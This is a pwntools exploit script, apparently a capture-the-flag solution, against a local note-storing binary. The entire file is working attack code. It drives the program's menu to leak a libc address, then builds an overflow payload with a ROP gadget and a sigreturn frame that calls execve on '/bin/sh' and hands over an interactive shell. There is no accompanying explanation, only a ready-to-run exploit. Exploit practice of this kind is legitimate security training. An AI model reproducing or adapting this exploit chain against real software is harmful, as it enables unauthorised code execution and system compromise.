from pwn import *

exe = context.binary = ELF('./notes', checksec=False)
context.clear(arch='amd64')
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x401A21
#         #    b*0x401B29
#            b*0x401b7a
#            ''')

pop_rdi = 0x0000000000401bc0
size_   = 0x1111111100000020
syscall = 0x0000000000401bc2

def store(id, name, size, content):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendafter(b'ID: ', str(id).encode('utf-8'))
    r.sendafter(b'Name: ', name)
    r.sendlineafter(b'Size: ', str(size).encode('utf-8'))
    r.sendafter(b'Content: ', content)
    
def delandshow(choice, id):
    r.sendlineafter(b'Choice: ', str(choice).encode('utf-8'))
    r.sendafter(b'ID: ', str(id).encode('utf-8'))
    
binsh_off = 0x274251
libc_off = 0x270041
    
payload = b'/bin/sh\x00' + b'a'*56
store(0, b'chino', 64, payload)

# upgrade
r.recvuntil(b'Sent!\n')
sleep(3)
r.sendline(b'4')
r.sendline(b'5000')
r.send(b'chino')

# leak libc
delandshow(3, 0)
out = r.recvuntil(b'\x7f')
print(out)
size = len(out)
libc_leak = out[size-6:size]
libc = u64(libc_leak + b'\x00'*2)
print(hex(libc))
libc_base = libc - libc_off
binsh = libc - binsh_off
print(hex(libc_base))
print(hex(binsh))
store(0, b'chino', 64, payload)
sleep(2)
payload += b'a'*8 + p64(pop_rdi) + p64(0xf) + p64(exe.sym['syscall'])

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall
payload += bytes(frame)
store(0, b'chino', 0x1000, payload)

# get shell
r.recvuntil(b'Sent!\n')
sleep(1)

r.interactive()